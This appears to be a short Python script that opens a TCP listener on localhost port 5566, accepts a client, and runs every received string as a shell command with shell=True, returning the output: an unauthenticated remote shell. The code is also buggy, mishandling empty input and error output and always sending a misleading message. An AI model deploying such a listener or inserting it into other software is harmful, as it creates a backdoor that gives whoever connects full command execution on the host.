import socket
from subprocess import Popen, PIPE
import subprocess
import pickle
import time

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(('127.0.0.1', 5566))
socket.listen(5)
client, address = socket.accept()
print("{} connected".format(address))
while True:

    sended = client.recv(255)

    cmd = sended.decode()
    if cmd == b'':
        time.sleep(10)
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, )

    stdout, stderr = process.communicate()
    if stderr is None:
        stderr = ""
    print(stdout, stderr)
    try:
        client.sendall(stdout)
    except:
        client.sendall(stderr)
    finally:
        client.sendall(str.encode("Command has returned any output"))

    pass
